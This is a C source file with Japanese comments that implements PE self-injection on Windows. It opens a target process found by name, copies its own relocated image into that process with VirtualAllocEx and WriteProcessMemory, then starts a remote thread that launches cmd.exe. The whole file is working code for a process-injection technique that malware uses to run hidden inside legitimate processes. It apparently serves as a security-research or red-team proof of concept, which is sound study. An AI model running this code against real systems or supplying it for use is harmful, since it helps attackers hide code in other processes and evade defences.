#include<stdio.h>
#include<Windows.h>
#include<winternl.h>
#include<TlHelp32.h>
#include<strsafe.h>
#include<tchar.h>

#define CountRelocationEntries(dwBlockSize) (dwBlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY)

typedef struct BASE_RELOCATION_BLOCK {
	DWORD PageAddress;
	DWORD BlockSize;
} BASE_RELOCATION_BLOCK, *PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;

} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;

DWORD WINAPI entryThread(LPVOID param) {
	WinExec("cmd.exe", 1);
	return 0;
}

void ErrorExit(LPCTSTR lpszFunction)
{
	// Retrieve the system error message for the last-error code
	LPVOID lpMsgBuf;
	DWORD dw = GetLastError();

	FormatMessage(
		FORMAT_MESSAGE_ALLOCATE_BUFFER |
		FORMAT_MESSAGE_FROM_SYSTEM |
		FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL,
		dw,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		(LPTSTR)&lpMsgBuf,
		0, NULL);

	// Display the error message and exit the process
	wprintf(L"[-] %s failed with error 0x%x: %s", lpszFunction, dw, lpMsgBuf);

	LocalFree(lpMsgBuf);
	ExitProcess(dw);
}

DWORD FindPIDByName(LPWSTR pName) {

	PROCESSENTRY32W pEntry;
	pEntry.dwSize = sizeof(PROCESSENTRY32W);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if ((DWORD)snapshot < 1)
	{
		ErrorExit(TEXT("CreateToolhelp32Snapshot"));
	}

	if (Process32FirstW(snapshot, &pEntry) == FALSE) {
		ErrorExit(TEXT("Process32First"));
	}

	do {
		if (lstrcmpW((LPCWSTR)pEntry.szExeFile, pName) == 0) {
			return pEntry.th32ProcessID;
		}
	} while (Process32NextW(snapshot, &pEntry));

	CloseHandle(snapshot);
	return 0;

}

int wmain(int argc, wchar_t **argv) {
	
	//第一引数にターゲットプロセス名が指定されているか
	if (argc != 2) {
		printf("Usage is failed.\r\n");
		return -1;
	}

	//ターゲットプロセス名からプロセスIDを取得
	DWORD pid = FindPIDByName(argv[1]);
	
	//ターゲットプロセスをオープン
	HANDLE hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (hTargetProcess == NULL) {
		ErrorExit(TEXT("OpenProcess"));
	}


	//自プロセスのイメージをコピーするためのメモリ領域を自プロセスメモリに確保
	HANDLE hProcess = GetModuleHandle(NULL);

	PIMAGE_DOS_HEADER pSelfDosHeader, pSelfCopyDosHeader;
	PIMAGE_NT_HEADERS pSelfNTHeader, pSelfCopyNTHeader;
	PIMAGE_SECTION_HEADER pSelfCopySectionHeader;
	PBASE_RELOCATION_BLOCK pTableHeader, pBlockHeader;

	pSelfDosHeader = (PIMAGE_DOS_HEADER)hProcess;
	pSelfNTHeader = (PIMAGE_NT_HEADERS)((PBYTE)hProcess + pSelfDosHeader->e_lfanew);

	if (IsBadReadPtr(hProcess, pSelfNTHeader->OptionalHeader.SizeOfImage)) {
		ErrorExit("IsBadReadPtr");
	}

	LPVOID lpSelfCopyBase = VirtualAlloc(NULL, pSelfNTHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (lpSelfCopyBase == NULL) {
		ErrorExit(TEXT("lpSelfCopyBase"));
	}

	//自プロセスのイメージを自プロセスメモリ上にコピー
	RtlCopyMemory(lpSelfCopyBase, hProcess, pSelfNTHeader->OptionalHeader.SizeOfImage);

	//ターゲットプロセスへPEコピー用のメモリを確保
	LPVOID lpNewImageBase = VirtualAllocEx(hTargetProcess, NULL, pSelfNTHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (lpNewImageBase == NULL) {
		ErrorExit("VirtualAllocEx");
	}

	//イメージベースが変わっているので再配置情報テーブルを参照して再配置処理を行う
	pSelfCopyDosHeader = (PIMAGE_DOS_HEADER)lpSelfCopyBase;
	pSelfCopyNTHeader = (PIMAGE_NT_HEADERS)((PBYTE)lpSelfCopyBase + pSelfCopyDosHeader->e_lfanew);
	pSelfCopyNTHeader->OptionalHeader.ImageBase = (DWORD)lpNewImageBase;

	DWORD dwDelta = (DWORD)lpNewImageBase - (DWORD)hProcess;

	const char *pSectionName = ".reloc";
	pSelfCopySectionHeader = IMAGE_FIRST_SECTION(pSelfCopyNTHeader);

	for (int i = 0; i < pSelfCopyNTHeader->FileHeader.NumberOfSections; i++) {

		//pSelfCopySectionHeader = (PIMAGE_SECTION_HEADER)(DWORD)pSelfCopyNTHeader + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER));
		if (memcmp(pSectionName, pSelfCopySectionHeader->Name, strlen(pSectionName)) == 0) {
			printf("[*] .reloc is found.\r\n");
			break;
		}

		pSelfCopySectionHeader++;

	}

	DWORD dwOffsetInRelocSection = 0;

	IMAGE_DATA_DIRECTORY relocData = pSelfCopyNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	pBlockHeader = pTableHeader = (PBASE_RELOCATION_BLOCK)((DWORD)lpSelfCopyBase + relocData.VirtualAddress);
	
	while (dwOffsetInRelocSection < relocData.Size) {

		dwOffsetInRelocSection += sizeof(BASE_RELOCATION_BLOCK);

		if (pBlockHeader->BlockSize > 0 && pBlockHeader->PageAddress > 0) {
			
			DWORD dwEntryCount = CountRelocationEntries(pBlockHeader->BlockSize);

			PBASE_RELOCATION_ENTRY pEntryIndex = (PBASE_RELOCATION_ENTRY)((DWORD)lpSelfCopyBase + relocData.VirtualAddress + dwOffsetInRelocSection);

			for (int j = 0; j < dwEntryCount; j++) {

				dwOffsetInRelocSection += sizeof(BASE_RELOCATION_ENTRY);

				if (pEntryIndex[j].Type == 0)
					continue;

				DWORD FieldAddress = (DWORD)lpSelfCopyBase + pBlockHeader->PageAddress + pEntryIndex[j].Offset;
				DWORD buf = 0;
				RtlCopyMemory(&buf, (LPBYTE)FieldAddress, sizeof(DWORD));

				buf += dwDelta;

				RtlCopyMemory((LPBYTE)FieldAddress, &buf, sizeof(DWORD));
			}
		}
		pBlockHeader = (PBASE_RELOCATION_BLOCK)((DWORD)pTableHeader + dwOffsetInRelocSection);
	}

	//ターゲットプロセスにPEをインジェクトする
	if (!WriteProcessMemory(hTargetProcess, lpNewImageBase, lpSelfCopyBase, pSelfCopyNTHeader->OptionalHeader.SizeOfImage, NULL)) {
		ErrorExit("WriteProcessMemory");
	}

	//ターゲットプロセスにスレッドを作成して実行させる
	LPTHREAD_START_ROUTINE remoteThread = (LPTHREAD_START_ROUTINE)((LPBYTE)entryThread + dwDelta);
	HANDLE a = CreateRemoteThread(hTargetProcess, NULL, 0, remoteThread, NULL, 0, NULL);
	if (a == NULL) {
		printf("CreateRemoteThread\r\n");
	}
	return 0;
}
